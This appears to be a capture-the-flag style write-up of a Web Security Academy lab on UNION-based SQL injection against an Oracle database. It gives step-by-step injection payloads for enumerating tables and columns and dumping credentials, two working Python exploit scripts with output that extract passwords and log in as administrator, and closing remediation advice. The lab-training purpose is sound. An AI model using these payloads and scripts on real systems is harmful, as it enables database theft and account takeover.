# SQL Injection in Parameter "category" at Endpoint /filter (Oracle Database)

**Severity:** High CVSS Score: 9.8 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

## Summary

A SQL Injection vulnerability was discovered in the category parameter at the /filter endpoint. The application runs on an Oracle database and does not sanitize user-supplied input before embedding it into SQL queries. An attacker can exploit this to enumerate database tables, extract all usernames and passwords, and log in as the administrator user — achieving a full account takeover with no authentication required.

## Root Cause

The application reflects unsanitized user input from the `category` parameter directly into a SQL query. This was confirmed by the following observed behaviors:
- Injecting a single quote (`'`) caused a **500 Internal Server Error**, indicating the character broke the SQL syntax.
- Injecting `'--` returned **200 OK**, confirming the comment sequence terminated the query successfully.
- A `UNION SELECT` payload returned data from an unrelated table, confirming the query is injectable and the result is reflected in the HTTP response.

This behavior is consistent with **unsanitized string concatenation** in the SQL query construction, rather than the use of Parameterized Queries or Prepared Statements.

This vulnerability is classified as:
**CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)**

## Steps to Reproduce

1. Open browser and access: `https://target.com/filter?category=Lifestyle`
2. Confirm SQL Injection by injecting a single quote: `Lifestyle'--` → Server responds 200 OK (no error = injectable)
3. Determine number of columns: `Lifestyle' ORDER BY 2--` → No error = 2 columns exist
4. Confirm both columns accept text data: `Lifestyle' UNION SELECT 'hacked','hacked' FROM dual--`
5. Enumerate Oracle DB version: `Lifestyle' UNION SELECT banner, null FROM v$version--`
6. List all tables in the database: `Lifestyle' UNION SELECT table_name, null FROM all_tables--` → Found table: `USERS_HXTXFT`
7. Enumerate columns inside `USERS_HXTXFT`: `Lifestyle' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name='USERS_HXTXFT'--` → Found columns: `USERNAME_NZZNWC`, `PASSWORD_YBEEKC`
8. Extract all usernames and passwords: `Lifestyle' UNION SELECT USERNAME_NZZNWC||' : '||PASSWORD_YBEEKC, null FROM USERS_HXTXFT--`
9. Log in as `administrator` using the extracted credentials.


## Proof of Concept

**Script 1** — Extract Credentials via UNION-based SQLi
```python
#!/usr/bin/env python3

import requests, re

URL = 'https://0a7f009904e9825780ea083600a30037.web-security-academy.net/filter'

def run():
    payload = "Lifestyle' union select USERNAME_NZZNWC|| ' : ' ||PASSWORD_YBEEKC, null from USERS_HXTXFT--"
    r = requests.get(URL, params={'category': payload})
    body = r.text
    print(f'[*] Payload: {payload}')
    print(f'[*] Status: {r.status_code}')

    if r.status_code == 500:
        print('[!] Error → SQL confirmed / bad syntax')

    if re.search(r'Congratulations|solved the lab', body):
        print('[✓] SOLVED')

    hint = re.findall(r'<p id="hint">(.*?)</p>', body)
    if hint:
        print(f'[*] Hint: {hint[0]}')

    items = re.findall(r'<t[hd]>(.*?)</t[hd]>', body)
    if items:
        print(f'[✓] Found {len(items)} list:')
    for item in items:
        clean = item.strip()
        if clean:
            print(f' → {clean}')

run()
```
**Result:**
```bash
./sqli.py
[*] Payload: Lifestyle' union select USERNAME_NZZNWC|| ' : ' ||PASSWORD_YBEEKC, null from USERS_HXTXFT--
[*] Status: 200
 → administrator : tyesd79e8z20oucubbli
 → carlos : mv2zhvsavlmayi48v99p
 → wiener : zzwhifvdtp0f5t77wd0t
```

**Script 2** — Login as Administrator (CSRF-aware)
```python
#!/usr/bin/env python3

import requests, re

username = "administrator"
password = "tyesd79e8z20oucubbli"

URL = 'https://0a7f009904e9825780ea083600a30037.web-security-academy.net/login'

session = requests.Session()

# Step 1: GET login page -> CSRF token
r = session.get(URL)
csrf = re.findall(r'name="csrf" value="(.+?)"', r.text)[0]
print(f'[*] CSRF token: {csrf}')

# Step 2: POST login
data = {'username': username,
        'password': password,
        'csrf': csrf
    }

r = session.post(URL, data=data)
print(f'[*] Status: {r.status_code}')

you_are_admin = re.findall(r'<p>(Your username.*?)</p>', r.text)
if you_are_admin:
    print(f'[✓] {you_are_admin[0]}')
```
**Result:**
```bash
./sqli_auth.py              
[*] CSRF token: TjUzq73rQICchOjIaJe87RDXsZkXNAgn
[*] Status: 200
[✓] Your username is: administrator
```

## Impact

1. Attackers can extract all plain text usernames and passwords from the database.
2. Attackers can log in as any user, including administrators.
3. Attackers have the potential to perform malicious data retrieval (DROP, DELETE) operations on the Oracle database.
4. Attackers have the ability to elevate privileges; unauthorized users will gain full administrator privileges.
5. All user credentials are stored in the USERS_HXTXFT table, which is considered highly vulnerable to public leakage.

## Remediation

### Short-term Fix
Apply **Parameterized Queries (Prepared Statements)** at the `/filter` endpoint — specifically the `category` parameter. 
Do NOT concatenate user input directly into SQL queries.

### Long-term Fix
- Validate and sanitize all user-supplied input server-side.
- Apply allowlist filtering on the `category` parameter (accept only known valid values).
- Enforce least-privilege on the database account — the application user should NOT have access to `all_tables` or `all_tab_columns`.
- Deploy a WAF to detect and block common SQLi patterns.

**Reference:**
OWASP SQL Injection Prevention Cheat Sheet
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
